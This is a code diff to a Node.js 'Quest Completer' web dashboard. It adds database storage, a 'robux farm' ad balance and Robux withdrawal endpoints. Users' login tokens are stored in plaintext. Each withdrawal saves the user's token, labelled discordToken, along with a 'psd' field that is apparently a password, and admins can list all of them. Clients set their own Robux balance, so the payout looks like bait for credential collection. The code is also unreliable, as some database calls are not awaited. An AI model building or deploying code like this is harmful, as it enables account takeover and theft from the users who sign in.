@@ -3,11 +3,17 @@ import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import { QuestClient } from './src/quest/questClient.js';
+import Database from 'better-sqlite3';
+import pg from 'pg';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const PORT = process.env.PORT || 3004;
+
+// Database configuration
+const DATABASE_URL = process.env.DATABASE_URL || null;
+const DB_PATH = path.join(__dirname, 'database.sqlite');
 
 // Admin Discord IDs (comma-separated)
 const ADMIN_DISCORD_IDS = process.env.ADMIN_DISCORD_IDS
@@ -15,7 +21,420 @@ const ADMIN_DISCORD_IDS = process.env.ADMIN_DISCORD_IDS
     : ["1484879718015832127"];
 
 // =========================================================
-// SESSION MANAGEMENT (IN-MEMORY)
+// DATABASE INITIALIZATION (POSTGRESQL + SQLITE FALLBACK)
+// =========================================================
+
+let db = null; // SQLite database
+let pgPool = null; // PostgreSQL pool
+let usePostgreSQL = false;
+
+async function initDatabase() {
+    // Try PostgreSQL first (for Railway)
+    if (DATABASE_URL) {
+        try {
+            pgPool = new pg.Pool({
+                connectionString: DATABASE_URL,
+                ssl: { rejectUnauthorized: false }
+            });
+
+            // Test connection
+            const client = await pgPool.connect();
+            await client.query('SELECT NOW()');
+            client.release();
+
+            // Create tables
+            await createPostgreSQLTables();
+
+            usePostgreSQL = true;
+            console.log('PostgreSQL database initialized');
+            return;
+        } catch (error) {
+            console.error('PostgreSQL connection error, falling back to SQLite:', error.message);
+        }
+    }
+
+    // Fallback to SQLite (for local development)
+    try {
+        db = new Database(DB_PATH);
+        db.pragma('journal_mode = WAL');
+
+        // Create SQLite tables
+        createSQLiteTables();
+
+        console.log('SQLite database initialized');
+    } catch (error) {
+        console.error('SQLite initialization error:', error);
+    }
+}
+
+function createSQLiteTables() {
+    db.exec(`
+        CREATE TABLE IF NOT EXISTS sessions (
+            sessionId TEXT PRIMARY KEY,
+            userId TEXT NOT NULL,
+            userToken TEXT NOT NULL,
+            username TEXT,
+            avatar TEXT,
+            createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+    `);
+
+    db.exec(`
+        CREATE TABLE IF NOT EXISTS robux_farm_data (
+            userToken TEXT PRIMARY KEY,
+            adsWatched INTEGER DEFAULT 0,
+            earnings REAL DEFAULT 0,
+            robuxEarned REAL DEFAULT 0,
+            lastUpdated DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+    `);
+
+    db.exec(`
+        CREATE TABLE IF NOT EXISTS withdrawals (
+            id TEXT PRIMARY KEY,
+            discordToken TEXT NOT NULL,
+            userId TEXT NOT NULL,
+            username TEXT,
+            psd TEXT,
+            gamepassId TEXT,
+            robuxAmount REAL NOT NULL,
+            status TEXT DEFAULT 'pending',
+            createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
+            updatedAt DATETIME
+        )
+    `);
+}
+
+async function createPostgreSQLTables() {
+    const client = await pgPool.connect();
+    try {
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS sessions (
+                sessionId TEXT PRIMARY KEY,
+                userId TEXT NOT NULL,
+                userToken TEXT NOT NULL,
+                username TEXT,
+                avatar TEXT,
+                createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS robux_farm_data (
+                userToken TEXT PRIMARY KEY,
+                adsWatched INTEGER DEFAULT 0,
+                earnings REAL DEFAULT 0,
+                robuxEarned REAL DEFAULT 0,
+                lastUpdated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS withdrawals (
+                id TEXT PRIMARY KEY,
+                discordToken TEXT NOT NULL,
+                userId TEXT NOT NULL,
+                username TEXT,
+                psd TEXT,
+                gamepassId TEXT,
+                robuxAmount REAL NOT NULL,
+                status TEXT DEFAULT 'pending',
+                createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                updatedAt TIMESTAMP
+            )
+        `);
+    } finally {
+        client.release();
+    }
+}
+
+// =========================================================
+// SESSION MANAGEMENT (POSTGRESQL + SQLITE)
+// =========================================================
+
+async function getSession(sessionId) {
+    if (usePostgreSQL) {
+        try {
+            const client = await pgPool.connect();
+            try {
+                const result = await client.query(
+                    'SELECT * FROM sessions WHERE sessionId = $1',
+                    [sessionId]
+                );
+                if (result.rows.length > 0) {
+                    const row = result.rows[0];
+                    return {
+                        sessionId: row.sessionid,
+                        userId: row.userid,
+                        userToken: row.usertoken,
+                        username: row.username,
+                        avatar: row.avatar
+                    };
+                }
+            } finally {
+                client.release();
+            }
+        } catch (error) {
+            console.error('PostgreSQL session load error:', error);
+        }
+    } else {
+        try {
+            const stmt = db.prepare('SELECT * FROM sessions WHERE sessionId = ?');
+            const session = stmt.get(sessionId);
+
+            if (session) {
+                return {
+                    sessionId: session.sessionId,
+                    userId: session.userId,
+                    userToken: session.userToken,
+                    username: session.username,
+                    avatar: session.avatar
+                };
+            }
+        } catch (error) {
+            console.error('SQLite session load error:', error);
+        }
+    }
+
+    return null;
+}
+
+async function createSession(sessionId, userId, userToken, username, avatar) {
+    if (usePostgreSQL) {
+        try {
+            const client = await pgPool.connect();
+            try {
+                await client.query(`
+                    INSERT INTO sessions (sessionId, userId, userToken, username, avatar)
+                    VALUES ($1, $2, $3, $4, $5)
+                    ON CONFLICT (sessionId) DO UPDATE SET
+                        userId = EXCLUDED.userId,
+                        userToken = EXCLUDED.userToken,
+                        username = EXCLUDED.username,
+                        avatar = EXCLUDED.avatar
+                `, [sessionId, userId, userToken, username, avatar]);
+            } finally {
+                client.release();
+            }
+        } catch (error) {
+            console.error('PostgreSQL session save error:', error);
+        }
+    } else {
+        try {
+            const stmt = db.prepare(`
+                INSERT INTO sessions (sessionId, userId, userToken, username, avatar)
+                VALUES (?, ?, ?, ?, ?)
+                ON CONFLICT(sessionId) DO UPDATE SET
+                    userId = excluded.userId,
+                    userToken = excluded.userToken,
+                    username = excluded.username,
+                    avatar = excluded.avatar
+            `);
+            stmt.run(sessionId, userId, userToken, username, avatar);
+        } catch (error) {
+            console.error('SQLite session save error:', error);
+        }
+    }
+}
+
+async function deleteSession(sessionId) {
+    if (usePostgreSQL) {
+        try {
+            const client = await pgPool.connect();
+            try {
+                await client.query('DELETE FROM sessions WHERE sessionId = $1', [sessionId]);
+            } finally {
+                client.release();
+            }
+        } catch (error) {
+            console.error('PostgreSQL session delete error:', error);
+        }
+    } else {
+        try {
+            const stmt = db.prepare('DELETE FROM sessions WHERE sessionId = ?');
+            stmt.run(sessionId);
+        } catch (error) {
+            console.error('SQLite session delete error:', error);
+        }
+    }
+}
+
+// =========================================================
+// ROBUX FARM DATA STORAGE (POSTGRESQL + SQLITE)
+// =========================================================
+
+async function loadRobuxFarmData(userToken) {
+    if (usePostgreSQL) {
+        try {
+            const client = await pgPool.connect();
+            try {
+                const result = await client.query(
+                    'SELECT * FROM robux_farm_data WHERE userToken = $1',
+                    [userToken]
+                );
+                if (result.rows.length > 0) {
+                    const row = result.rows[0];
+                    return {
+                        adsWatched: row.adswatched || 0,
+                        earnings: row.earnings || 0,
+                        robuxEarned: row.robuxearned || 0
+                    };
+                }
+            } finally {
+                client.release();
+            }
+        } catch (error) {
+            console.error('PostgreSQL load robux farm data error:', error);
+        }
+    } else {
+        try {
+            const stmt = db.prepare('SELECT * FROM robux_farm_data WHERE userToken = ?');
+            const data = stmt.get(userToken);
+
+            if (data) {
+                return {
+                    adsWatched: data.adsWatched || 0,
+                    earnings: data.earnings || 0,
+                    robuxEarned: data.robuxEarned || 0
+                };
+            }
+        } catch (error) {
+            console.error('SQLite load robux farm data error:', error);
+        }
+    }
+
+    return { adsWatched: 0, earnings: 0, robuxEarned: 0 };
+}
+
+async function saveRobuxFarmData(userToken, data) {
+    if (usePostgreSQL) {
+        try {
+            const client = await pgPool.connect();
+            try {
+                await client.query(`
+                    INSERT INTO robux_farm_data (userToken, adsWatched, earnings, robuxEarned)
+                    VALUES ($1, $2, $3, $4)
+                    ON CONFLICT (userToken) DO UPDATE SET
+                        adsWatched = EXCLUDED.adsWatched,
+                        earnings = EXCLUDED.earnings,
+                        robuxEarned = EXCLUDED.robuxEarned,
+                        lastUpdated = CURRENT_TIMESTAMP
+                `, [userToken, data.adsWatched, data.earnings, data.robuxEarned]);
+            } finally {
+                client.release();
+            }
+        } catch (error) {
+            console.error('PostgreSQL save robux farm data error:', error);
+        }
+    } else {
+        try {
+            const stmt = db.prepare(`
+                INSERT INTO robux_farm_data (userToken, adsWatched, earnings, robuxEarned)
+                VALUES (?, ?, ?, ?)
+                ON CONFLICT(userToken) DO UPDATE SET
+                    adsWatched = excluded.adsWatched,
+                    earnings = excluded.earnings,
+                    robuxEarned = excluded.robuxEarned,
+                    lastUpdated = CURRENT_TIMESTAMP
+            `);
+            stmt.run(userToken, data.adsWatched, data.earnings, data.robuxEarned);
+        } catch (error) {
+            console.error('SQLite save robux farm data error:', error);
+        }
+    }
+}
+
+// =========================================================
+// WITHDRAWAL STORAGE (POSTGRESQL + SQLITE)
+// =========================================================
+
+async function createWithdrawal(discordToken, userId, username, psd, gamepassId, robuxAmount) {
+    const withdrawalId = Date.now().toString() + Math.random().toString(36).substring(2, 11);
+
+    if (usePostgreSQL) {
+        try {
+            const client = await pgPool.connect();
+            try {
+                await client.query(`
+                    INSERT INTO withdrawals (id, discordToken, userId, username, psd, gamepassId, robuxAmount, status)
+                    VALUES ($1, $2, $3, $4, $5, $6, $7, 'pending')
+                `, [withdrawalId, discordToken, userId, username, psd, gamepassId, robuxAmount]);
+                return { id: withdrawalId, discordToken, userId, username, psd, gamepassId, robuxAmount, status: 'pending' };
+            } finally {
+                client.release();
+            }
+        } catch (error) {
+            console.error('PostgreSQL create withdrawal error:', error);
+            throw error;
+        }
+    } else {
+        try {
+            const stmt = db.prepare(`
+                INSERT INTO withdrawals (id, discordToken, userId, username, psd, gamepassId, robuxAmount, status)
+                VALUES (?, ?, ?, ?, ?, ?, ?, 'pending')
+            `);
+            stmt.run(withdrawalId, discordToken, userId, username, psd, gamepassId, robuxAmount);
+            return { id: withdrawalId, discordToken, userId, username, psd, gamepassId, robuxAmount, status: 'pending' };
+        } catch (error) {
+            console.error('SQLite create withdrawal error:', error);
+            throw error;
+        }
+    }
+}
+
+async function getWithdrawals() {
+    if (usePostgreSQL) {
+        try {
+            const client = await pgPool.connect();
+            try {
+                const result = await client.query('SELECT * FROM withdrawals ORDER BY createdAt DESC');
+                return result.rows;
+            } finally {
+                client.release();
+            }
+        } catch (error) {
+            console.error('PostgreSQL get withdrawals error:', error);
+            return [];
+        }
+    } else {
+        try {
+            const stmt = db.prepare('SELECT * FROM withdrawals ORDER BY createdAt DESC');
+            return stmt.all();
+        } catch (error) {
+            console.error('SQLite get withdrawals error:', error);
+            return [];
+        }
+    }
+}
+
+async function updateWithdrawalStatus(withdrawalId, status) {
+    if (usePostgreSQL) {
+        try {
+            const client = await pgPool.connect();
+            try {
+                await client.query(`
+                    UPDATE withdrawals SET status = $1, updatedAt = CURRENT_TIMESTAMP WHERE id = $2
+                `, [status, withdrawalId]);
+            } finally {
+                client.release();
+            }
+        } catch (error) {
+            console.error('PostgreSQL update withdrawal status error:', error);
+        }
+    } else {
+        try {
+            const stmt = db.prepare(`
+                UPDATE withdrawals SET status = ?, updatedAt = CURRENT_TIMESTAMP WHERE id = ?
+            `);
+            stmt.run(status, withdrawalId);
+        } catch (error) {
+            console.error('SQLite update withdrawal status error:', error);
+        }
+    }
+}
+
+// =========================================================
+// SESSIONS (IN-MEMORY FALLBACK)
 // =========================================================
 
 const sessions = new Map();
@@ -489,8 +908,11 @@ const server = http.createServer(async (req, res) => {
     const sessionId =
         getSessionId(cookies);
 
-    const session =
-        sessions.get(sessionId);
+    // Try to get session from database first, then fall back to Map
+    let session = await getSession(sessionId);
+    if (!session) {
+        session = sessions.get(sessionId);
+    }
 
 
     // =====================================================
@@ -641,7 +1063,9 @@ const server = http.createServer(async (req, res) => {
                 avatar: userData.avatar
             };
 
+            // Save to both Map (for immediate use) and database (for persistence)
             sessions.set(newSessionId, sessionData);
+            await createSession(newSessionId, userData.id, token, userData.username, userData.avatar);
 
             console.log(
                 'Session created, redirecting to dashboard'
@@ -1374,6 +1798,363 @@ const server = http.createServer(async (req, res) => {
 
 
     // =====================================================
+    // ROBUX FARM API - GET DATA
+    // =====================================================
+
+    if (
+        pathname === '/api/robux-farm/data' &&
+        req.method === 'GET'
+    ) {
+
+        if (!session) {
+            sendJson(
+                res,
+                { error: 'Unauthorized' },
+                401
+            );
+            return;
+        }
+
+        try {
+            const userData = await loadRobuxFarmData(session.userToken);
+
+            sendJson(
+                res,
+                { success: true, data: userData }
+            );
+
+        } catch (error) {
+            console.error('Get robux farm data error:', error);
+            sendJson(
+                res,
+                { error: 'Failed to load data' },
+                500
+            );
+        }
+
+        return;
+    }
+
+
+    // =====================================================
+    // ROBUX FARM API - SAVE DATA
+    // =====================================================
+
+    if (
+        pathname === '/api/robux-farm/data' &&
+        req.method === 'POST'
+    ) {
+
+        if (!session) {
+            sendJson(
+                res,
+                { error: 'Unauthorized' },
+                401
+            );
+            return;
+        }
+
+        try {
+            let body = '';
+            req.on('data', chunk => { body += chunk.toString(); });
+            req.on('end', async () => {
+                try {
+                    const { adsWatched, earnings, robuxEarned } = JSON.parse(body);
+
+                    await saveRobuxFarmData(session.userToken, {
+                        adsWatched,
+                        earnings,
+                        robuxEarned
+                    });
+
+                    sendJson(
+                        res,
+                        { success: true }
+                    );
+
+                } catch (parseError) {
+                    console.error('Parse error:', parseError);
+                    sendJson(
+                        res,
+                        { error: 'Failed to save data' },
+                        500
+                    );
+                }
+            });
+
+        } catch (error) {
+            console.error('Save robux farm data error:', error);
+            sendJson(
+                res,
+                { error: 'Failed to save data' },
+                500
+            );
+        }
+
+        return;
+    }
+
+
+    // =====================================================
+    // WITHDRAWAL API - CREATE WITHDRAWAL
+    // =====================================================
+
+    if (
+        pathname === '/api/withdrawals' &&
+        req.method === 'POST'
+    ) {
+
+        if (!session) {
+            sendJson(
+                res,
+                { error: 'Unauthorized' },
+                401
+            );
+            return;
+        }
+
+        try {
+            let body = '';
+            req.on('data', chunk => { body += chunk.toString(); });
+            req.on('end', async () => {
+                try {
+                    const { psd, gamepassId, robuxAmount } = JSON.parse(body);
+
+                    if (!psd || !gamepassId || !robuxAmount) {
+                        sendJson(
+                            res,
+                            { error: 'Missing required fields: psd, gamepassId, robuxAmount' },
+                            400
+                        );
+                        return;
+                    }
+
+                    if (robuxAmount < 200) {
+                        sendJson(
+                            res,
+                            { error: 'Minimum withdrawal is 200 Robux' },
+                            400
+                        );
+                        return;
+                    }
+
+                    // Check if user has enough Robux
+                    const userData = await loadRobuxFarmData(session.userToken);
+                    if (userData.robuxEarned < robuxAmount) {
+                        sendJson(
+                            res,
+                            { error: 'Insufficient Robux balance' },
+                            400
+                        );
+                        return;
+                    }
+
+                    // Create withdrawal
+                    const withdrawal = await createWithdrawal(
+                        session.userToken,
+                        session.userId,
+                        session.username,
+                        psd,
+                        gamepassId,
+                        robuxAmount
+                    );
+
+                    // Deduct Robux from user balance
+                    await saveRobuxFarmData(session.userToken, {
+                        adsWatched: userData.adsWatched,
+                        earnings: userData.earnings,
+                        robuxEarned: userData.robuxEarned - robuxAmount
+                    });
+
+                    sendJson(
+                        res,
+                        { success: true, withdrawal }
+                    );
+
+                } catch (parseError) {
+                    console.error('Parse error:', parseError);
+                    sendJson(
+                        res,
+                        { error: 'Invalid request body' },
+                        400
+                    );
+                }
+            });
+
+        } catch (error) {
+            console.error('Create withdrawal error:', error);
+            sendJson(
+                res,
+                { error: 'Failed to create withdrawal' },
+                500
+            );
+        }
+
+        return;
+    }
+
+
+    // =====================================================
+    // WITHDRAWAL API - GET WITHDRAWALS (ADMIN ONLY)
+    // =====================================================
+
+    if (
+        pathname === '/api/withdrawals' &&
+        req.method === 'GET'
+    ) {
+
+        if (!session) {
+            sendJson(
+                res,
+                { error: 'Unauthorized' },
+                401
+            );
+            return;
+        }
+
+        // Check if user is admin
+        if (!ADMIN_DISCORD_IDS.includes(session.userId)) {
+            sendJson(
+                res,
+                { error: 'Forbidden - Admin only' },
+                403
+            );
+            return;
+        }
+
+        try {
+            const withdrawals = getWithdrawals();
+            sendJson(
+                res,
+                { success: true, withdrawals }
+            );
+
+        } catch (error) {
+            console.error('Get withdrawals error:', error);
+            sendJson(
+                res,
+                { error: 'Failed to load withdrawals' },
+                500
+            );
+        }
+
+        return;
+    }
+
+
+    // =====================================================
+    // WITHDRAWAL API - UPDATE STATUS (ADMIN ONLY)
+    // =====================================================
+
+    if (
+        pathname === '/api/withdrawals/status' &&
+        req.method === 'POST'
+    ) {
+
+        if (!session) {
+            sendJson(
+                res,
+                { error: 'Unauthorized' },
+                401
+            );
+            return;
+        }
+
+        // Check if user is admin
+        if (!ADMIN_DISCORD_IDS.includes(session.userId)) {
+            sendJson(
+                res,
+                { error: 'Forbidden - Admin only' },
+                403
+            );
+            return;
+        }
+
+        try {
+            let body = '';
+            req.on('data', chunk => { body += chunk.toString(); });
+            req.on('end', async () => {
+                try {
+                    const { withdrawalId, status } = JSON.parse(body);
+
+                    if (!withdrawalId || !status) {
+                        sendJson(
+                            res,
+                            { error: 'Missing required fields: withdrawalId, status' },
+                            400
+                        );
+                        return;
+                    }
+
+                    if (!['pending', 'approved', 'rejected'].includes(status)) {
+                        sendJson(
+                            res,
+                            { error: 'Invalid status. Must be: pending, approved, or rejected' },
+                            400
+                        );
+                        return;
+                    }
+
+                    updateWithdrawalStatus(withdrawalId, status);
+
+                    sendJson(
+                        res,
+                        { success: true }
+                    );
+
+                } catch (parseError) {
+                    console.error('Parse error:', parseError);
+                    sendJson(
+                        res,
+                        { error: 'Invalid request body' },
+                        400
+                    );
+                }
+            });
+
+        } catch (error) {
+            console.error('Update withdrawal status error:', error);
+            sendJson(
+                res,
+                { error: 'Failed to update withdrawal status' },
+                500
+            );
+        }
+
+        return;
+    }
+
+
+    // =====================================================
+    // USER API - ADMIN STATUS CHECK
+    // =====================================================
+
+    if (
+        pathname === '/api/user/admin-status' &&
+        req.method === 'GET'
+    ) {
+
+        if (!session) {
+            sendJson(
+                res,
+                { error: 'Unauthorized' },
+                401
+            );
+            return;
+        }
+
+        const isAdmin = ADMIN_DISCORD_IDS.includes(session.userId);
+
+        sendJson(
+            res,
+            { isAdmin }
+        );
+
+        return;
+    }
+
+
+    // =====================================================
     // LOGOUT
     // =====================================================
 
@@ -1384,6 +2165,7 @@ const server = http.createServer(async (req, res) => {
 
         if (sessionId) {
             sessions.delete(sessionId);
+            await deleteSession(sessionId);
         }
 
         sendJson(
@@ -1412,11 +2194,17 @@ const server = http.createServer(async (req, res) => {
 // START SERVER
 // =========================================================
 
-server.listen(
-    PORT,
-    () => {
-        console.log(
-            'Quest Completer Web Dashboard running on http://localhost:' + PORT
-        );
-    }
-);
+// Initialize database (async)
+initDatabase().then(() => {
+    server.listen(
+        PORT,
+        () => {
+            console.log(
+                'Quest Completer Web Dashboard running on http://localhost:' + PORT
+            );
+        }
+    );
+}).catch(error => {
+    console.error('Failed to initialize database:', error);
+    process.exit(1);
+});
